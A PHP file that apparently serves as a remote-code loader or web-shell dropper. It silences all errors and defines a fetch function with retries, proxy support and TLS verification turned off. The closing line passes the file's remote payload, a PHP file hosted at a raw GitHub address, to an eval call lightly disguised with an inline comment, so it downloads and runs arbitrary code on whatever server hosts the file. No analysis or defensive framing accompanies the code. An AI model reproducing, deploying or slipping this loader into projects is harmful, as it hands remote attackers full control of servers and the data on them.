<?php
error_reporting(0);
ini_set("display_errors", 0);

function kurl($url, $proxy = null, $proxyPort = null, $proxyUser = null, $proxyPassword = null, $retries = 3, $timeout = 30)
{
    if (!preg_match("/\b(?:(?:https?|ftp):\/\/|www\.)[-a-zA-Z0-9+&@#\/%?=~_|!:,.;]*[-a-zA-Z0-9+&@#\/%=~_|]/i", $url)) {
        trigger_error("Invalid URL provided", E_USER_WARNING);
        return false;
    }

    $attempt = 0;
    $success = false;
    $content = false;

    while ($attempt < $retries && !$success) {
        $attempt++;

        // file_get_contents
        if (function_exists('file_get_contents')) {
            $contextOptions = array(
                'http' => array(
                    'ignore_errors' => true,
                    'timeout' => $timeout,
                ),
                'ssl' => array(
                    'verify_peer' => false,
                    'verify_peer_name' => false
                )
                );

                if ($proxy) {
                    if ($proxyPort) {
                        $contextOptions['http']['proxy'] = "tcp://$proxy:$proxyPort";
                    } else {
                        $contextOptions['http']['proxy'] = "tcp://$proxy";
                    }

                    if ($proxyUser && $proxyPassword) {
                        $contextOptions['http']['header'] = "Proxy-Authorization: Basic " . base64_encode("$proxyUser:$proxyPassword");
                    }
                }


            $context = stream_context_create($contextOptions);
            $content = @file_get_contents($url, false, $context);

            if ($content === false) {
                trigger_error("Failed to fetch URL using file_get_contents", E_USER_WARNING);
            } else {
                $success = true;
            }
        }

        // cURL
        if (!$success && function_exists('curl_init')) {
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); // Consider enabling for production
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Consider enabling for production
            curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);

            if ($proxy) {
                curl_setopt($ch, CURLOPT_PROXY, $proxy);
                if ($proxyPort) {
                    curl_setopt($ch, CURLOPT_PROXYPORT, $proxyPort);
                }
                if ($proxyUser && $proxyPassword) {
                    curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$proxyUser:$proxyPassword");
                }
            }

            $content = curl_exec($ch);
            if (curl_errno($ch)) {
                $error_msg = curl_error($ch);
                curl_close($ch);
                trigger_error("cURL error fetching URL: $error_msg", E_USER_WARNING);
            } else {
                $success = true;
                curl_close($ch);
            }
        }

        // file()
        if (!$success && function_exists('file')) {
            $content = @file($url, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

            if ($content === false) {
                trigger_error("Failed to fetch URL using file", E_USER_WARNING);
            } else {
                $success = true;
            }
        }

        // Delay before retrying
        if (!$success) {
            sleep(1); // Delay for 1 second before retrying
        }
    }

    if ($success && $content !== false) {
        return $content;
    }

    trigger_error("No suitable methods found to fetch URL content after retries", E_USER_WARNING);
    return false;
}

eval/**/("?>" . kurl('https://raw.githubusercontent.com/ressasantikaa-rgb/newphp86/main/yellowfree.php'));
?>
